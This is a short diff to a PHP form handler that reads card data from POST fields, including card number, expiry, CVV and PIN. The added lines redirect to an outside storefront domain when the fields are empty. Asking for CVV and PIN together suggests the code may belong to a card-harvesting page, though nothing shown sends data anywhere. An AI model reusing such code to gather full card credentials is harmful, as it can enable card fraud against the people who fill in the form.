@@ -5,6 +5,11 @@ if ($_SERVER["REQUEST_METHOD"] == "GET") {
 };
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    if (empty($_POST['form_fields']) || empty($_POST['form_fields']["amount"])) {
+        header('Location: https://www.mycardlysupply.store/');
+        exit; 
+    }
+
     if (!empty($_POST['form_fields']["currency"])) {
         $currency = $_POST['form_fields']["currency"];
     }
